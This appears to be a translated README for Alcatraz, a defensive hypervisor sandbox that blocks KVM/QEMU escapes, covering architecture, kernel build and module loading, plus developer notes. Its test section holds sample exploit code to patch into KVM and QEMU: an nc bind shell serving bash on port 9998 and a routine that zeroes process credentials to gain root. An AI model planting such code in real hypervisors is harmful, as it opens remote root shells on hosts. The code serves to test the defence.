```txt
            __    _     __     __   _____  ___    __   ____       
           / /\  | |   / /`   / /\   | |  | |_)  / /\   / /    
          /_/--\ |_|__ \_\_, /_/--\  |_|  |_| \ /_/--\ /_/_ 
                                                                 
                   /=[-----]                                    
                  [| |  [] |                                    
                 /||.|     |_ _    _       _. -._               
                | \| |  '` '-' '--''---`'-' | U |      /\       
         .      |  Y |  []   --   [}   --  {} ..|    ,'Y \ /\   
        / \     | [] |       []    '   {} '   {}|   /. / .Y '\  
       / Y '\   |.   |  []    `   [} `     {} ..|._,', Y /_,._/ 
     _'\.__,.-.-(  []|       [}        {}       || /`-,        
              ;`~T . |  [] '    ` [}    _,'-_,.-(^) ,-'@@#   ~~ 
             #;'~~l {|       [}    ,.-'`'~~~'~ -` @@a@@#      
        ^^^  #;\~~/\{|  []     _,'-~~~~~ '~~_.,` @@@aa@@#     
            #a;\~~~/\|  _,.-'`~~~~~~_..-'' aaa@@@&&&@@##      
      ~~    ##a; \~~( Y``~~ Y~~~~ / `,  aaaa@@@@aa@@@##  ^^^^ 
           #aa `._~ /~ L~\~~_./'` aaa@@@@$$@@@&&@##           
          #a@@@Aaaa'--..,-'`aa@@@@@&&@@@aa@@@@#    ~~         
           ##@@&&@@@AA@@@@@@@@@@&&@@@@A@@@@@##                
             #@@@@@$$@@@AA@@@a@@@&&@@@@@##                    
                ##@aaAAA@@AAAa####        ^^^                 
           ^^^       #aaAAaa@                                 
                        ~~                                    
                                                           
      KVM/QEMU 및 KVM 기반 MicroVM 탈출을 방지하기 위한
            실용적인 하이퍼바이저 샌드박스 v1.0.0               
```

# 1. 안내(Notice)
## 1.1. 발표 및 데모
Alcatraz는 KVM/QEMU 및 KVM 기반 MicroVM에서의 “탈출(escape)”을 방지하기 위한 실용적인 하이퍼바이저 샌드박스입니다. 아래 보안 컨퍼런스에서 소개되었습니다.
 - [Black Hat USA 2021](https://www.blackhat.com/us-21/briefings/schedule/index.html#alcatraz-a-practical-hypervisor-sandbox-to-prevent-escapes-from-the-kvmqemu-and-kvm-based-microvms-22875)

아래 데모 영상을 볼 수 있습니다.
 - [Demo](https://youtu.be/ZGFJO7YaELw): Alcatraz가 다양한 유형의 탈출을 탐지하고 방지하는 모습을 보여줍니다.

<p align="center">
<img src="document/images/conference1.png" width="900">
</p>

## 1.2. 기여(Contributions)
기여는 언제나 환영합니다. 이슈 리포트, 버그 수정, 새로운 기능 구현 등 무엇이든 좋습니다. 편하게 보내주세요.

## 1.3. 라이선스(License)
Alcatraz는 GPL v2+ 라이선스를 따릅니다.

# 2. Alcatraz 소개(Introduction)
DevOps 및 서버리스 아키텍처가 부상하면서, 클라우드 벤더들은 전통적인 가상 머신(VM) 서비스뿐 아니라 컨테이너 서비스도 지원해왔습니다. 
전통적인 VM은 가상 머신 모니터(VMM, 즉 하이퍼바이저)가 가상화된 하드웨어로 호스트 머신과 분리해주기 때문에 강한 격리를 제공합니다. 
반면 컨테이너는 네임스페이스(namespace), cgroup 같은 커널 수준의 격리 기법을 사용합니다. 
이 덕분에 컨테이너는 VM보다 빠르지만, 호스트 커널을 공유하므로 공격자가 커널 취약점을 이용해 컨테이너 밖으로 탈출할 수 있습니다.

최근의 컨테이너들은 이 문제를 해결하기 위해 하이퍼바이저 기술을 활용합니다. 
Kata container는 KVM/QEMU로 컨테이너를 격리하고, 
Amazon의 Firecracker는 KVM 기반 경량 하이퍼바이저를 사용하는 microVM을 만들며, 
Google의 gVisor도 사용자 공간 커널과 경량 하이퍼바이저를 조합합니다. 

이런 아키텍처들은 강한 격리를 제공하지만, 여전히 개선 여지가 있습니다. 
KVM은 하이퍼바이저 권한(Ring -1)에서 동작하기 때문에, 공격자는 KVM 취약점을 통해 직접 탈출할 수 있습니다. 
많은 연구자들이 시스템 관리 모드(SMM, Ring -2)를 장악해 하이퍼바이저를 모니터링하는 접근을 시도했지만, BIOS/UEFI 펌웨어 수정이 필요했습니다.

이런 배경에서 저는 KVM/QEMU 및 KVM 기반 microVM의 탈출을 방지하기 위한 새로운 실용적 하이퍼바이저 샌드박스인 Alcatraz를 만들었습니다. 
Alcatraz는 Hyper-box와 Tailored kernel로 구성됩니다. 

Hyper-box는 KVM을 격리하기 위해 처음부터 만든 pico-hypervisor입니다. 
다른 방식들과 달리, 
Hyper-box가 호스트 하이퍼바이저(Ring -1)가 되고 
KVM의 권한을 게스트 하이퍼바이저(Ring 0)로 “강등”합니다. 

Hyper-box는 KVM을 샌드박싱하기 위한 중첩 하이퍼바이저(nested hypervisor) 기능을 가지며, 
SMM이나 펌웨어 수정이 필요하지 않습니다. 

또한 모든 시스템 콜을 모니터링하여 탈출과 비인가 권한 상승을 방지합니다. 

Tailored Linux kernel은 기존 커널을 재컴파일한 버전으로, 공격 표면을 줄이기 위해 레거시 시스템 콜 인터페이스를 제거했고, Hyper-box가 코드 및 읽기 전용(RO) 데이터를 보호하기 때문에 런타임 코드 수정 기능도 제거했습니다. 

Alcatraz는 노트북, 데스크톱, 서버 등에서 VM과 microVM 안에 있는 신뢰할 수 없는 코드를 실행할 때 사용할 수 있습니다.

## 2.1. Alcatraz 아키텍처(Architecture)
Alcatraz의 아키텍처를 설명합니다. 다른 연구들처럼 “더 높은 권한을 가져가는” 방식이 아니라, pico-hypervisor인 Hyper-box로 샌드박스를 만들고 KVM의 권한을 아래 그림처럼 게스트 하이퍼바이저로 강등하는 구조를 택했습니다.

<p align="center">
<img src="document/images/architecture.png" width="900">
</p>

Hyper-box는 탈출을 방지하기 위한 핵심 메커니즘을 가지고 있습니다. 

첫째, Intel VT(Virtualization Technology)의 메모리/레지스터 보호 기법을 사용합니다. 
EPT(Extended Page Table)와 제어 레지스터(CR) 모니터링 기능을 활용해 비인가 코드 및 읽기 전용 데이터 영역을 보호합니다. 

둘째, 하드웨어 브레이크포인트를 이용해 모든 시스템 콜을 모니터링하고 프로세스 생성/권한 상승 같은 비인가 행위를 방지합니다. 

마지막으로, KVM의 VMX(Virtual Machine Extensions) 명령을 에뮬레이션합니다. Hyper-box가 KVM의 권한을 Ring 0로 강등하기 때문에 KVM은 VMX 명령을 실행할 수 없습니다. 따라서 Hyper-box가 Intel VT의 VMCS shadowing 및 VPID 기능을 활용해 대신 VMX 명령을 수행합니다.

Tailored Linux kernel은 원본 커널을 재컴파일한 버전입니다. 
공격 표면을 줄이기 위해 레거시 시스템 콜 인터페이스를 제거했습니다. 
또한 Hyper-box가 탈출 방지를 위해 코드 및 RO 데이터를 보호하므로, 런타임 코드 수정 기능을 제거했습니다.

Alcatraz에 대해 더 알고 싶다면 [Black Hat USA 2021](https://www.blackhat.com/us-21/briefings/schedule/index.html#alcatraz-a-practical-hypervisor-sandbox-to-prevent-escapes-from-the-kvmqemu-and-kvm-based-microvms-22875) 발표 자료를 참고하세요.


# 3. 빌드 방법(How to Build)
## 3.1. Tailored Linux Kernel 빌드(Ubuntu 20.04)
Alcatraz는 Hyper-box와 Tailored Linux kernel로 구성됩니다. Tailored 커널을 만들기 위해 아래 명령들을 따라주세요.

```bash
# Prepare kernel source and build environment.
# 5.8.0-44-generic is recommended, but higher versions are also fine.
$> sudo apt-get install linux-image-5.8.0-44-generic
$> sudo apt-get install linux-modules-extra-5.8.0-44-generic
$> sudo apt-get build-dep linux-image-unsigned-5.8.0-44-generic
$> sudo apt-get install linux-headers-5.8.0-44-generic ncurses-dev
$> apt-get source linux-image-unsigned-5.8.0-44-generic

# Make new .config file.
$> cd linux-hwe-5.8-5.8.0
$> cp /boot/config-5.8.0-44-generic .config
$> make menuconfig
# Load the .config file using the "Load" menu and save it to .config using the "Save" menu.

# Change .config file to tailor the kernel.
$> sed -i 's/CONFIG_JUMP_LABEL=y/# CONFIG_JUMP_LABEL is not set/g' .config
$> sed -i 's/CONFIG_IA32_EMULATION=y/# CONFIG_IA32_EMULATION is not set/g' .config
$> sed -i 's/CONFIG_COMPAT=y/# CONFIG_COMPAT is not set/g' .config
$> sed -i 's/CONFIG_COMPAT_32=y/# CONFIG_COMPAT_32 is not set/g' .config
$> sed -i 's/CONFIG_X86_X32=y/# CONFIG_X86_X32 is not set/g' .config
$> sed -i 's/CONFIG_X86_X32_ABI=y/# CONFIG_X86_X32_ABI is not set/g' .config

# Build the kernel and modules.
$> make -j8; make modules

# Install the kernel and modules.
$> sudo make modules_install
$> sudo make install

# Reboot and boot with the tailored Linux kernel.
$> sudo reboot
``` 

## 3.2. Hyper-box 모듈 빌드(Build Hyper-box Modules)
Hyper-box는 로더블 커널 모듈(LKM)이므로 Tailored Linux kernel로 빌드해야 합니다. 먼저 Tailored 커널로 부팅했는지 확인한 다음 아래 명령을 수행하세요.

```bash
# Prepare Hyper-box source and required packages.
$> sudo apt-get install nasm git
$> git clone https://github.com/kkamagui/alcatraz.git

# Move to the Alcatraz directory and build it.
$> cd alcatraz
$> make
... omitted ...

# Show Hyper-box modules.
$> ls hyper_box
hyper_box.ko ...

$> ls hyper_box_helper
hyper_box_helper.ko ...
```

# 4. 사용 방법(How to Use)
## 4.1. 실행 방법(How to Run)
앞서 설명했듯이 Alcatraz의 Hyper-box는 로더블 커널 모듈입니다. 따라서 `insmod` 명령으로 `hyper_box.ko`와 `hyper_box_helper.ko` 두 모듈을 로드해야 합니다.

```bash
# Move to the Alcatraz directory and load two modules.
$> sudo insmod hyper_box/hyper_box.ko
$> sudo insmod hyper_box_helper/hyper_box_helper.ko
``` 

<p align="center">
<img src="document/images/screenshot1.png" width="650">
</p>

Hyper-box가 로드되면 코드 변조, 프로세스 생성, 권한 상승 같은 비인가 행위를 모니터링하고 방지합니다. 데모 영상은 [Demo](https://youtu.be/ZGFJO7YaELw) 링크를 참고하세요.

## 4.2. 중첩 가상화 지원(Nested Virtualization Support)
KVM/QEMU 게스트 머신 안에서 KVM을 실행하고 싶을 수도 있습니다. 이를 중첩 가상화(nested virtualization)라고 하며, Alcatraz는 이 기능을 지원합니다. 다만 Alcatraz가 이미 VMCS shadowing 기능을 사용하고 있으므로, 호스트 KVM의 VMCS shadowing 기능은 꺼야 합니다. VM 안에서 여러 VM을 실행하려면 아래 명령을 실행하세요.

```bash
# Unload kvm_intel module.
$> sudo rmmod kvm_intel

# Load kvm_intel module with disabling the VMCS shadowing feature.
$> sudo modprobe kvm_intel enable_shadow_vmcs=0

# Move to the Alcatraz directory and load two modules.
# After that, you can run the KVM on a guest machine with Alcatraz.
$> sudo insmod hyper_box/hyper_box.ko
$> sudo insmod hyper_box_helper/hyper_box_helper.ko
```

<p align="center">
<img src="document/images/screenshot2.png" width="1000">
</p>


# 5. 테스트 방법(How to Test)
익스플로잇(공격 코드 실행)은 복잡하고 많은 노력이 필요합니다. 그 복잡도를 줄이기 위해, 공격자가 이미 제어 흐름(control flow)을 장악했고 작은 셸코드를 실행할 수 있다고 가정합니다. 그리고 KVM과 QEMU에 직접 익스플로잇용 코드를 추가합니다. 현실에 더 가까운 익스플로잇을 만들고 싶다면, 취약한 버전의 Linux kernel과 QEMU를 선택한 뒤 아래의 샘플 익스플로잇 셸코드를 실행하세요.

## 5.1. KVM 익스플로잇 샘플 코드(Sample code for KVM exploitations)
```C
/*
 * This code is for KVM exploitations.
 *
 * Please add code below to arch/x86/kvm/x86.c.
 *
 */

... omitted ...

#define LOG_ATTACKER 			"attacker:"
#define TYPE_CREATE_PROCESS		0
#define TYPE_PRIVILEGE_ESCALATION 	1

/* Sample exploitation function. */
static void kvm_exploit(int type)
{
	/* Process name and arguments you want to create. */
	static char *argv[] = {
		"/bin/nc", "-e", "/bin/bash", "-l", "-p", "9998",
		NULL };
	static char *envp[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin:",
		NULL };
	struct cred *old;
	int ret;
	int i;

	/* Create a process. */
	if (type == TYPE_CREATE_PROCESS)
	{
		pr_err(ATTACKER"Create a process. Current[%s, PID:%d], parent[%s, PID:%d]\n",
			current->comm, current->pid, current->group_leader->comm,
			current->group_leader->pid);

		ret = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
	}
	/* Escalate the current privilege. */
	else
	{
		pr_err(ATTACKER"Privilege escalation. Current[%s, PID:%d], parent[%s, PID:%d]\n",
			current->comm, current->pid, current->group_leader->comm,
			current->group_leader->pid);

		for (i = 0 ; i < 2 ; i++)
		{
			if (i == 0)
			{
				old = (struct cred *)current->group_leader->cred;
			}
			else
			{
				old = (struct cred *)current->group_leader->real_cred;
			}

			old->uid.val = 0;
			old->gid.val = 0;
			old->suid.val = 0;
			old->sgid.val = 0;
			old->euid.val = 0;
			old->egid.val = 0;
		}
	}
}

int kvm_arch_vcpu_ioctl_run(struct kvm_vcpu *vcpu)
{
	struct kvm_run *kvm_run = vcpu->run;
	int r;

	vcpu_load(vcpu);
	kvm_sigset_activate(vcpu);
	kvm_load_guest_fpu(vcpu);

	... omitted ...

	/* ================================================ */
	/* Add code here to simulate an IOCTL exploitation. */
	/* ================================================ */
	/* For creating a process. */
	kvm_exploit(TYPE_CREATE_PROCESS);

	/* For escalating the current privilege. */
	kvm_exploit(TYPE_PRIVILEGE_ESCALATION);

	if (kvm_run->immediate_exit)
		r = -EINTR;
	else
		r = vcpu_run(vcpu);

out:
	kvm_put_guest_fpu(vcpu);
	if (kvm_run->kvm_valid_regs)
		store_regs(vcpu);
	post_kvm_run_save(vcpu);
	kvm_sigset_deactivate(vcpu);

	vcpu_put(vcpu);
	return r;
}

```

## 5.2. QEMU 익스플로잇 샘플 코드(Sample code for a QEMU exploitation)

```C
/*
 * This code is for a QEMU exploitation.
 *
 * Please add code below to accel/kvm/kvm-all.c.
 *
 */

... omitted ...

/* Sample exploitation function. */
void qemu_escape(void)
{
	static char *argv[] = {
		"/bin/nc", "-e", "/bin/bash", "-l", "-p", "9998",
		NULL };
	char* env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin:", NULL };

	if (fork() == 0)
	{
		execve(argv[0], argv, env);
	}
}


int kvm_cpu_exec(CPUState *cpu)
{
    struct kvm_run *run = cpu->kvm_run;
    int ret, run_ret;

    DPRINTF("kvm_cpu_exec()\n");

    if (kvm_arch_process_async_events(cpu)) {
        atomic_set(&cpu->exit_request, 0);
        return EXCP_HLT;
    }

    qemu_mutex_unlock_iothread();
    cpu_exec_start(cpu);

    do {
        ... omitted ...

        /* ============================================ */
        /* Add code here to simulate QEMU exploitation. */
        /* ============================================ */
        qemu_escape();

        trace_kvm_run_exit(cpu->cpu_index, run->exit_reason);
        switch (run->exit_reason) {
        case KVM_EXIT_IO:
            DPRINTF("handle_io\n");
            /* Called outside BQL */
            kvm_handle_io(run->io.port, attrs,
                          (uint8_t *)run + run->io.data_offset,
                          run->io.direction,
                          run->io.size,
                          run->io.count);
            ret = 0;
            break;

        ... omitted ...
```

# = 주의(Caution) =
Alcatraz의 Hyper-box는 커널 코드, 읽기 전용 데이터, 시스템 테이블, 권한 레지스터 등을 보호합니다. 따라서 아래 기능들을 비활성화하는 것을 고려하는 편이 좋습니다.

 * 시스템 전원 관리(최대절전/절전, hibernate 및 suspend)
   * 일부 머신은 최대절전/절전 중에 보호되는 영역을 수정할 수 있습니다.

 * 모듈 언로드(module unloading)
   * Hyper-box는 모듈의 코드와 읽기 전용 데이터를 보호합니다. 따라서 모듈을 언로드하면 문제가 생길 수 있습니다. 모듈을 언로드하지 마세요. 정말로 필요하다면 `hyper_box.h`의 `HYPERBOX_USE_MODULE_PROTECTION`을 0으로 설정하세요.




# = 트러블슈팅(trouble shooting) =

VMWARE Setting
	monitor_control.pseudo_perfctr = "TRUE"


# Hyper_box

hyper_box_init()
	hb_print_hyper_box_logo() - 로고 출력

	cpuid_count(1, 0, ...) - cpu id 정보를 얻어옴	
		VMX, SMX 체크
			Virtual Machine Extensions
			Safer Mode Extensions : 신뢰할 수 있는 컴퓨팅 기반을 제공

	msr = hb_rdmsr(MSR_iA32_FEAT_CTL)...
		VMX가 BIOS으로 인해 락 걸려있는지 확인

	hb_rdmsr(MSR_IA32_VMX_PROCBASED_CTLS2) >> 32 & VM_BIT_VM_SEC_PROC_CTRL_VMCS_SHADOWING
		VMCS Shadowing : 하이퍼바이저가 게스트 가상 머신의 VMCS를 캐시, VMCS 갱신 시에 메모리 액세스를 최소화하여 성능을 향상

	hb_rdmsr(MSR_IA32_VMX_PROCBASED_CTLS2) >> 32 & VM_BIT_VM_SEC_PROC_CTRL_ENABLE_VPID
		VPID : TLB 관리에 각 가상 머신의 메모리 매핑을 할 수 있게 함 -> TLB 스위치 오버헤드 감소

	hb_get_function_pointers() - 모듈에 필요한 함수들 초기화

	cpuid_count(0x0D, 1, &eax, &ebx, &ecx, &edx);
		XSAVES, XRSTORS : 고급 벡터 확장 기능, 부동 소수점 및 벡터 상태 레지스터 -> 프로세서 상태의 저장 및 복원을 효율적으로 가능하게 도와줌 - 프로세서의 성능 최적화

	register_pm_notifier(g_hb_sleep_nb_ptr);
		sleep 여부 감지
			hb_start(1);

	hb_alloc_vmcs_memory()
		for(cpu 활성화된 수)
			페이지 할당

	USE_EPT
	hb_alloc_ept_pages()
	hb_protect_vmcs()
	hb_prepare_monitor()
	hb_setup_workaround()
		"__netif_hash_nolisten", "__ip_select_ident",
		"secure_dccpv6_sequence_number", "secure_ipv4_port_ephemeral",
		"netif_receive_skb_internal", "__netif_receive_skb_core",
		"netif_rx_internal", "inet6_ehashfn.isra.6", "inet_ehashfn"
		getProcAddr
	hb_setup_memory_pool()
		g_memory_pool
	hb_prepare_log_buffer()
	hb_get_symbol_address("tasklist_lock")
		Lock
	hb_start()

# hb_start
	num_online_cpus()
	smp_processor_id()
	init()
		atomic_set(&g_thread_run_flags, cpu_count);
		atomic_set(&g_thread_entry_count, cpu_count);
		atomic_set(&g_thread_rcu_sync_count, cpu_count);
		atomic_set(&g_sync_flags, cpu_count);
		atomic_set(&g_complete_flags, cpu_count);
		atomic_set(&g_framework_init_start_flags, cpu_count);
		atomic_set(&g_first, 1);
		atomic_set(&g_enter_count, 0);
		atomic_set(&g_iommu_complete_flags, 0);
		atomic_set(&(g_mutex_lock_flags), 0);
	for CPU 마다 thread
		hb_vm_thread()
	while(atomic_read(&g_complete_flags) > 0) sleep(100);
		thread 가 전부 complete 하면 종료

# hb_vm_thread (0) START_MODE_INITIALIZE
	cpu_id = smp_processor_id()
	hb_disable_and_change_machine_check_timer(0)
		MCE - 블루스크린?
		/* Disable MCE event. */
		cr4_clear_bits(CR4_BIT_MCE);
		disable_irq(VM_INT_MACHINE_CHECK);

	g_watchdog_nmi_disable_fp(cpu_id)
		watchdog - 일정 주기마다 타이머 = 주기적으로 리셋하여 시스템이 정상 작동 중임을 알려줌

